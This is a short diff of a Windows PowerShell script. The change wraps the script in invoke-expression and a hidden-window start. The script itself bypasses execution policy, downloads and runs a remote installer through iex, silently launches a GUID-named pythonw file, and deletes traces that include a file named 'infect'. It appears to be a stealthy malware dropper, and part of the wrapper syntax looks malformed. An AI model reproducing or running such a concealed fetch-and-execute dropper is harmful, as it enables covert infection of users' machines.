@@ -1,3 +1,4 @@
+invoke-expression 'cmd /c start -WindowStyle hidden -Command {
 cd "C:\Users\$Env:Username\Desktop";
 Set-ExecutionPolicy Bypass -Scope Process -Force; [System.Net.ServicePointManager]::SecurityProtocol = [System.Net.ServicePointManager]::SecurityProtocol -bor 3072; iex ((New-Object System.Net.WebClient).DownloadString("https://community.chocolatey.org/install.ps1"));
 $env:Path = [System.Environment]::GetEnvironmentVariable("Path","Machine") + ";" + [System.Environment]::GetEnvironmentVariable("Path","User");
@@ -24,4 +25,5 @@ start pythonw main-5f3767bb-df88-4d84-91e2-01536aceb09b.pyw;
 rm ".gitignore-3b122184-a6bd-44a8-b414-dd7a0ef9df91";
 rm "requirements-0697d2d6-577d-43b2-88f7-8868e1398414.txt";
 rm "infect-381c6330-2b8c-4b34-8874-3a7ae012864a.txt";
+}';
 exit;
